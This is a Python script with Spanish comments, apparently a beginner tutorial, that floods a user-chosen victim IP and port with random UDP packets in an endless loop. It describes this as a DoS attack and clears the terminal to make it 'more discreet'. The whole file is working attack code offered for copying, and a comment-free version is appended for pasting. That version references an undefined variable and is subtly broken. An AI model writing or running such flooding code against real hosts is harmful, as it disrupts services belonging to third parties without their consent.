import random
import socket
import os
#AL FINAL DEL SCRIPT TENEIS EL CODIGO PARA COPIARLO SI NO QUEREIS COMENTARIOS
#Aqui he importado las herramientas necesarias, random es para aleatorizar los bytes a enviar
#socket es para poder crear un socket para conexion UDP
#y os es para poder averiguar el sistema operativo de nuestro usuario y limpiar su terminal

#aqui solo estoy poniendo mi marca de autor
alex=("""

    ########           ####             ###########       ####   ####
   ##########          ####             ###                ########
  ####    ####         ####             ##########          #######
 ##############        ####             ##########         ##########
####        ####       ############     ###               #####  #####       
###          ####      ############     ###########      #####    #####           
""")

# Limpiar la terminal para que el ataque sea mas discreto
os.system("cls" if os.name == "nt" else "clear")

# Crear un socket UDP para poder establecer una conexion
connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Solicitar al usuario la ip victima
print("Ingresa la IP de la víctima por favor")
ip = input("IP>")

# Solicitar al usuario la cantidad de bytes para el ataque
size_attack = int(input("Por favor ingresa un número de bytes que deseas enviar a la víctima: "))

#Solicitar al usuario el puerto victima
print("Introduce el puerto de la víctima por favor")
port = int(input("PUERTO>"))

#Añado algunas lineas inecesarias xd
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")


#La parte interesante del programa donde se va a lanzar el ataque
while True:
    try:
        connect.sendto(bytes(random.randint(0, 255) for _ in range(size_attack)), (ip, port))
        print("Ataque enviado correctamente")
        print(alex)
        print(alex)
        print(alex)
    except KeyboardInterrupt:
        print("Cancelado por el usuario")
        break
#Estamos creando un bucle para atacar al puerto de la victima usando la variable connect y el metodo send to
#aleatorizando los bytes en el rango del ataque que especificamos
#Si el usuario ejecuta CTRL + C el ataque se detendrá


#Y eso es todo, este es un ejemplo sencillo 
#de como hacer un ataque DoS al puerto de una ip de una misma ip
#Aunque no es nada efectivo, no espereis que haga algo esto, es un ataque solo de ejemplo



#espero que os sirva aqui os dejo todo el codigo sin comentarios por si quereis copiarlo sin mas:

"""
import random
import socket
import os
os.system("cls" if os.name == "nt" else "clear")
connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("Ingresa la IP de la víctima por favor")
ip = input("IP>")
size_attack = int(input("Por favor ingresa un número de bytes que deseas enviar a la víctima: "))
print("Introduce el puerto de la víctima por favor")
port = int(input("PUERTO>"))
print("Preparando el ataque...")
while True:
    try:
        connect.sendto(bytes(random.randint(0, 255) for _ in range(size_attack)), (ip, port))
        print("Ataque enviado correctamente")
        print(alex)
    except KeyboardInterrupt:
        print("Cancelado por el usuario")
        break
"""

#chaoo